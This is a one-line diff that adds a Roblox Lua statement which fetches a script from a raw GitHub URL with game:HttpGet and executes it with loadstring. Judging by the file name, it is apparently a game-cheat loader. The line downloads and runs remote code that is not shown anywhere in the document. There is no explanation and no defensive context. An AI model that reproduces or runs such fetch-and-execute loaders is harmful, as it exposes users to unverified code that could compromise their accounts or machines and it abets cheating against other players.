@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/fps-flick-spam2-m1shvv9ijb7f10.lua"))()
